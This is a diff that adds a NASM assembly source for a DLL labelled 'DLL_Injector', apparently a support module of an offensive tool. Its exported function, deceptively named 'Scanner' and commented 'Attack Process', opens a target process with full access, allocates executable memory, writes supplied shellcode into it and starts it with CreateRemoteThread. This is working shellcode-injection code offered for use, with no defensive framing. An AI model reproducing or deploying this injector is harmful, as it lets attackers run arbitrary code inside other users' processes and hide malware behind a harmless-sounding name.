@@ -1,0 +1,109 @@
+#!name##DLL_Injector
+#!types##support
+#!info##DLL library
+#!setVar##DLL_export_func##Scanner##str
+
+; --------- IMPORTS ---------                       
+extern _ExitProcess@4
+extern _printf
+extern _GetLastError@0
+extern _OpenProcess@12
+extern _VirtualAllocEx@20
+extern _WriteProcessMemory@20
+extern _CreateRemoteThread@28
+extern _WaitForSingleObject@8
+
+
+section .data
+    
+
+section .bss
+    proc_pid resd 1
+    sc_point resd 1
+    proc_handle resd 1
+    sc_len resd 1
+    bytes_wr resd 1
+    mem_addr resd 1
+    th_handle resd 1
+
+section .text
+    global DllMain
+    global _Scanner
+
+
+DllMain:
+    mov eax, 1
+    ret
+
+; Attack Process
+; IN: ecx - PID number
+; IN: edx - shellcode pointer
+; IN: ebx - shellcode length
+; OUT: eax - '0' - Fail, '1' - Success
+_Scanner:
+    mov [proc_pid], ecx
+    mov [sc_point], edx
+    mov [sc_len], ebx
+    
+    ; Open Process
+    push dword [proc_pid]    ; dwProcessId
+    push 0          ; bInheritHandle
+    push 0x001FFFFF ; PROCESS_ALL_ACCESS
+    call _OpenProcess@12
+    cmp eax, 0
+    je .error
+    
+    mov [proc_handle], eax  ; save process handler
+    
+    ; Alloc Memory
+    push dword 0x40     ; PAGE_EXECUTE_READWRITE
+    push dword 0x00001000 | 0x00002000      ; MEM_COMMIT | MEM_RESERVE
+    push dword [sc_len]
+    push dword 0        ; lpAddress
+    push dword [proc_handle]    ; process handler
+    call _VirtualAllocEx@20
+    cmp eax, 0
+    je .error
+    mov [mem_addr], eax     ; save memory address
+    
+    ; Write Memory
+    push bytes_wr      ;A pointer to a variable that receives the number of bytes transferred into the specified process.
+    push dword [sc_len]
+    push dword [sc_point]
+    push dword [mem_addr]
+    push dword [proc_handle]
+    call _WriteProcessMemory@20
+    cmp eax, 0
+    je .error
+    
+    
+    ; Create Remote Thread
+    push 0      ; lpThreadId
+    push 0      ; dwCreationFlags
+    push 0      ; lpParameter
+    push dword [mem_addr]     ; lpStartAddress
+    push 0      ; dwStackSize
+    push 0      ; lpThreadAttributes
+    push dword [proc_handle]      ;hProcess
+    call _CreateRemoteThread@28
+    cmp eax, 0
+    je .error
+    mov [th_handle], eax    ; save thread handler
+    
+    
+    ; Wait
+    push 0xFFFFFFFF  ; INFINITE
+    push dword [th_handle]
+    call _WaitForSingleObject@8
+    
+   
+    xor eax, eax
+    mov eax, 1
+    jmp .exit_func
+    
+    .error:
+        xor eax, eax    ; return Fail
+        
+    
+    .exit_func:
+        ret
